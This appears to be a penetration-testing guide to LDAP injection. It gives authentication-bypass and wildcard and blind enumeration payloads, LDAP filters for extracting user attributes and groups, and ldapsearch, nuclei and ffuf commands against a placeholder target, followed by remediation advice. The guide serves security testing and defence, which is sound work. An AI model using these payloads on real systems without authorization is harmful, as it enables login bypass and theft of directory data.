# LDAP Injection Testing

## Overview
LDAP Injection exploits applications that construct LDAP queries from user input without proper sanitization. Attackers can modify LDAP statements to bypass authentication, access unauthorized data, or modify directory information.

## Classification
- **CWE:** CWE-90 (Improper Neutralization of Special Elements used in an LDAP Query)
- **OWASP:** A03:2021 - Injection
- **CVSS Base:** 7.5 - 9.8

## Detection Methodology

### 1. LDAP Query Structure
```
(&(attribute=value)(attribute2=value2))
(|(attribute=value)(attribute2=value2))
```

### 2. Authentication Bypass
```
# Original: (&(uid=USER)(password=PASS))

# Bypass attempts:
user=*)(|(&     password=any)       → (&(uid=*)(|(&)(password=any)))
user=admin)(&)  password=any        → (&(uid=admin)(&))(password=any))
user=*          password=*          → (&(uid=*)(password=*))
user=admin)(|   password=pwd)       → Always true
user=*)(%26     password=any        → URL-encoded AND
```

### 3. Wildcard Injection
```
# Data enumeration via wildcards
user=a*    → Find users starting with 'a'
user=ad*   → Narrow down: 'ad...'
user=adm*  → Further: 'adm...'
user=admin → Found: 'admin'

# Attribute existence testing
user=admin)(|(description=*
```

### 4. Boolean-Based Blind
```
# True condition (login succeeds)
admin)(&(objectClass=*)
# False condition (login fails)
admin)(&(objectClass=invalid_class)
```

### 5. Special Characters
```
* (wildcard)
( ) (group operators)
& (AND)
| (OR)
! (NOT)
\ (escape)
/ (DN separator)
NUL (%00, null byte)
```

### 6. Common Injection Points
- Login forms (username, password fields)
- User search functionality
- Directory browsing
- Group membership queries
- Address book lookups
- SSO/federation endpoints

## LDAP-Specific Enumeration

### User Enumeration
```
# Extract usernames character by character
(&(uid=a*)(objectClass=*))    → exists?
(&(uid=b*)(objectClass=*))    → exists?

# Extract attributes
(&(uid=admin)(description=*)) → has description?
(&(uid=admin)(mail=*))        → has email?
```

### Attribute Extraction
```
# Enumerate available attributes
(&(uid=admin)(telephoneNumber=*))
(&(uid=admin)(homeDirectory=*))
(&(uid=admin)(loginShell=*))
(&(uid=admin)(sshPublicKey=*))
```

### Group Enumeration
```
(&(objectClass=groupOfNames)(cn=admin*))
(&(objectClass=posixGroup)(memberUid=admin))
```

## Tool Usage

### ldapsearch (for verified access)
```bash
# Anonymous bind
ldapsearch -x -H ldap://target:389 -b "dc=company,dc=com" "(objectClass=*)"

# Authenticated
ldapsearch -x -H ldap://target:389 -D "cn=admin,dc=company,dc=com" -w password -b "dc=company,dc=com"

# Extract specific attributes
ldapsearch -x -H ldap://target:389 -b "dc=company,dc=com" "(uid=*)" cn mail
```

### Automated Testing
```bash
# Nuclei LDAP templates
nuclei -u http://target.com -t ldap/ -batch

# Custom fuzzing with ffuf
ffuf -u http://target.com/login -d "user=FUZZ&pass=test" -w ldap-payloads.txt
```

## Remediation
1. **Input validation** — reject LDAP special characters: `( ) * \ / NUL`
2. **LDAP-specific escaping** — use framework's LDAP escape functions
3. **Parameterized LDAP queries** where supported
4. **Least privilege** LDAP bind accounts
5. **Disable anonymous binds** in production
6. **Access controls** on LDAP directory entries

## Evidence Collection
- Injected payload and response
- Users/groups enumerated
- Attributes discovered
- Authentication bypass proof
- Directory structure mapped
